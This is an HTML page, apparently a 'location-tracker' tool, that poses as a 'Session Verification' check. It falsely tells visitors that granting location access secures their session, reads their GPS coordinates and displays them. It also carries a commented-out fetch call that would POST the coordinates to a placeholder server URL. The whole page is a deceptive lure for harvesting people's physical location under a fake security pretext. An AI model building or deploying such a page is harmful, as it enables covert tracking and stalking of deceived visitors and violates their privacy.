# location-tracker
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Session Verification...</title>
  <style>
    body {
      background-color: #f0f2f5;
      font-family: 'Arial', sans-serif;
      text-align: center;
      padding-top: 100px;
      color: #333;
    }
    .spinner {
      margin: 30px auto;
      width: 50px;
      height: 50px;
      border: 6px solid #ccc;
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .message {
      font-size: 20px;
      margin-top: 20px;
    }
    .small-text {
      font-size: 14px;
      color: #777;
      margin-top: 10px;
    }
    a {
      display: inline-block;
      margin-top: 20px;
      font-size: 16px;
      color: #007bff;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <h1>Session Verification in Progress...</h1>
  <div class="spinner"></div>
  <div class="message">Please allow location access to continue</div>
  <div class="small-text">This helps us secure your session and verify authenticity.</div>

  <script>
    function success(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const accuracy = position.coords.accuracy;

      document.body.innerHTML = `
        <h2>Access Verified ✅</h2>
        <p><strong>Latitude:</strong> ${latitude}</p>
        <p><strong>Longitude:</strong> ${longitude}</p>
        <p><strong>Accuracy:</strong> ${accuracy} meters</p>
        <a href="https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}" target="_blank">📍 View on Google Maps</a>
      `;

      // Optional: send to server
      /*
      fetch('YOUR_SERVER_URL', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ latitude, longitude, accuracy })
      });
      */
    }

    function error(err) {
      document.body.innerHTML = "<h2>Location Access Denied ❌</h2><p>Please refresh and allow access to continue.</p>";
      console.warn(`ERROR(${err.code}): ${err.message}`);
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(success, error);
    } else {
      document.body.innerHTML = "<h2>Geolocation not supported ❌</h2>";
    }
  </script>

</body>
</html>
